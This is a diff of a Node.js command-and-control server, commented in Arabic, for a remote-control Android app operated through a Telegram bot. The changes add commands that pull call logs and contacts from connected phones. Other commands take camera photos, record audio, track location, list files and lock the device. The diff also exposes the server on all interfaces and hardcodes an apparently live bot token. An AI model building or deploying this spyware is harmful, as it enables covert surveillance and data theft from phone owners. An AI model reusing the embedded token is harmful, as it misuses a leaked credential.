@@ -1,21 +1,27 @@
-hereconst express = require('express');
+const express = require('express');
 const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
 
-// ⚡ الإعدادات - غير هذه القيم حسب احتياجك
+// ⚡ الإعدادات - ضع بياناتك هنا مباشرة
 const config = {
-    TELEGRAM_TOKEN: "ضع_توكن_البوت_هنا", // @BotFather
-    AUTHORIZED_USERS: [123456789], // أيدي التلجرام الخاص بك
-    SERVER_PORT: 3000,
-    SERVER_HOST: "localhost" // محلي فقط للأمان
+    // 🔧 غير هذه القيم حسب بياناتك:
+    TELEGRAM_TOKEN: "8330048649:AAFYzP0EvuJTYm__yo4AROYvIt3fy-HDGXY", // ضع توكن البوت هنا
+    AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
+    SERVER_PORT: process.env.PORT || 3000,
+    SERVER_HOST: "0.0.0.0"
 };
 
-// التأكد من وجود التوكن
-if (config.TELEGRAM_TOKEN === "ضع_توكن_البوت_هنا") {
-    console.log("❌ يرجى إضافة توكن البوت في config");
+// 🚨 تحذير إذا لم تغير البيانات
+if (config.TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789") {
+    console.log("❌ يرجى تغيير التوكن في السطر 10");
+    process.exit(1);
+}
+
+if (config.AUTHORIZED_USERS[0] === 123456789) {
+    console.log("❌ يرجى تغيير أيدي التلجرام في السطر 11");
     process.exit(1);
 }
 
@@ -26,34 +32,42 @@ const wss = new WebSocket.Server({ server });
 const bot = new TelegramBot(config.TELEGRAM_TOKEN, { polling: true });
 
 // ⚡ تخزين البيانات
-const connectedDevices = new Map(); // الأجهزة المتصلة
-const userSessions = new Map();     // جلسات المستخدمين
+const connectedDevices = new Map();
+const userSessions = new Map();
 
-// ⚡ وسائط Express
+// 🌐 وسائط Express
 app.use(express.json());
 app.use(express.static('public'));
 
-// 🌐 مسارات الويب (للمراقبة فقط)
+// 📊 صفحة المراقبة
 app.get('/', (req, res) => {
     res.send(`
         <html>
             <head><title>Remote Control Server</title></head>
-            <body>
-                <h1>🛜 سيرفر التحكم عن بعد</h1>
-                <p>الأجهزة المتصلة: <span id="count">${connectedDevices.size}</span></p>
-                <div id="devices"></div>
-                
+            <body style="font-family: Arial, sans-serif; padding: 20px;">
+                <h1>🎮 سيرفر التحكم عن بعد</h1>
+                <div style="background: #f0f0f0; padding: 15px; border-radius: 10px;">
+                    <h3>📱 الأجهزة المتصلة: <span id="count">${connectedDevices.size}</span></h3>
+                    <div id="devices"></div>
+                </div>
                 <script>
                     function updateDevices() {
                         fetch('/api/devices')
                             .then(r => r.json())
                             .then(data => {
                                 document.getElementById('count').textContent = data.count;
-                                document.getElementById('devices').innerHTML = 
-                                    data.devices.map(d => '<p>📱 ' + d + '</p>').join('');
+                                const devicesDiv = document.getElementById('devices');
+                                if (data.devices.length > 0) {
+                                    devicesDiv.innerHTML = data.devices.map(d => 
+                                        '<div style="background: white; margin: 10px 0; padding: 10px; border-radius: 5px;">' +
+                                        '📱 ' + d + '</div>'
+                                    ).join('');
+                                } else {
+                                    devicesDiv.innerHTML = '<p>لا توجد أجهزة متصلة</p>';
+                                }
                             });
                     }
-                    setInterval(updateDevices, 5000);
+                    setInterval(updateDevices, 3000);
                     updateDevices();
                 </script>
             </body>
@@ -61,6 +75,7 @@ app.get('/', (req, res) => {
     `);
 });
 
+// 📡 API للأجهزة
 app.get('/api/devices', (req, res) => {
     res.json({
         count: connectedDevices.size,
@@ -88,7 +103,8 @@ wss.on('connection', (ws, req) => {
         type: 'welcome',
         deviceId: deviceId,
         message: 'تم الاتصال بنجاح بالسيرفر',
-        timestamp: Date.now()
+        timestamp: Date.now(),
+        server: 'Render.com'
     }));
 
     // 📩 استقبال البيانات من APK
@@ -101,7 +117,7 @@ wss.on('connection', (ws, req) => {
         }
     });
 
-    // 📡 إرسال بيانات الاتصال للتلجرام
+    // 📨 إرسال بيانات الاتصال للتلجرام
     broadcastToTelegram(`📱 جهاز جديد متصل:\n- المعرف: ${deviceId}\n- IP: ${clientIp}\n- الوقت: ${new Date().toLocaleString()}`);
 
     // 🔌 عند انقطاع الاتصال
@@ -158,10 +174,28 @@ function handleDeviceMessage(deviceId, message) {
             break;
 
         case 'file_list':
+            const files = message.data.files || [];
             broadcastToTelegram(
                 `📁 ملفات الجهاز ${deviceId}:\n` +
-                message.data.files.slice(0, 10).map(f => `📄 ${f}`).join('\n') +
-                (message.data.files.length > 10 ? `\n... و ${message.data.files.length - 10} ملفات أخرى` : '')
+                files.slice(0, 10).map(f => `📄 ${f}`).join('\n') +
+                (files.length > 10 ? `\n... و ${files.length - 10} ملفات أخرى` : '')
+            );
+            break;
+
+        case 'call_logs':
+            const calls = message.data.calls || [];
+            broadcastToTelegram(
+                `📞 سجل المكالمات ${deviceId}:\n` +
+                calls.slice(0, 10).map(c => `📞 ${c.number} - ${c.duration}`).join('\n')
+            );
+            break;
+
+        case 'contacts':
+            const contacts = message.data.contacts || [];
+            broadcastToTelegram(
+                `👥 جهات الاتصال ${deviceId}:\n` +
+                contacts.slice(0, 10).map(c => `👤 ${c.name}: ${c.number}`).join('\n') +
+                (contacts.length > 10 ? `\n... و ${contacts.length - 10} جهة اتصال` : '')
             );
             break;
 
@@ -189,11 +223,13 @@ bot.onText(/\/start/, (msg) => {
 📍 /location - موقع الجهاز
 📁 /files - استعراض ملفات الجهاز
 📷 /camera - صورة من الكاميرا
+📞 /calls - سجل المكالمات
+👥 /contacts - جهات الاتصال
 🎤 /record - تسجيل صوت
 🔒 /lock - قفل الجهاز
 
-استخدم: /command deviceId
-مثال: /screen device123
+⚡ الاستخدام: /command deviceId
+مثال: /screen device_abc123
         `,
         { parse_mode: 'Markdown' }
     );
@@ -211,6 +247,7 @@ bot.onText(/\/status/, (msg) => {
 📱 الأجهزة: ${connectedDevices.size} متصل
 ⏰ التشغيل: ${formatUptime(process.uptime())}
 💾 الذاكرة: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB
+🔐 المستخدمون: ${config.AUTHORIZED_USERS.length}
         `,
         { parse_mode: 'Markdown' }
     );
@@ -294,6 +331,34 @@ bot.onText(/\/camera (.+)/, (msg, match) => {
     bot.sendMessage(chatId, `📷 جاري التقاط صورة من ${deviceId}...`);
 });
 
+// 📞 سجل المكالمات
+bot.onText(/\/calls (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'get_call_logs',
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `📞 جاري جلب سجل المكالمات من ${deviceId}...`);
+});
+
+// 👥 جهات الاتصال
+bot.onText(/\/contacts (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'get_contacts',
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `👥 جاري جلب جهات الاتصال من ${deviceId}...`);
+});
+
 // 🎤 التسجيل
 bot.onText(/\/record (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
@@ -302,7 +367,7 @@ bot.onText(/\/record (.+)/, (msg, match) => {
     const deviceId = match[1].trim();
     sendToDevice(deviceId, {
         type: 'record_audio',
-        duration: 10000, // 10 ثواني
+        duration: 10000,
         replyTo: chatId
     });
 
@@ -327,7 +392,6 @@ bot.onText(/\/lock (.+)/, (msg, match) => {
 function sendToDevice(deviceId, command) {
     const device = connectedDevices.get(deviceId);
     if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
-        // إعلام المستخدم بأن الجهاز غير متصل
         const chatId = command.replyTo;
         if (chatId) {
             bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
@@ -372,7 +436,7 @@ server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
     console.log(`🎯 سيرفر التحكم يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
     console.log(`🤖 بوت التلجرام جاهز للاستخدام`);
     console.log(`📱 متوافق مع APK عبر WebSocket`);
-    console.log(`🔒 الأمان: محلي فقط - لا اتصالات خارجية`);
+    console.log(`🔐 المستخدمون المصرح لهم: ${config.AUTHORIZED_USERS.join(', ')}`);
 });
 
 // 🛡️ معالجة الأخطاء
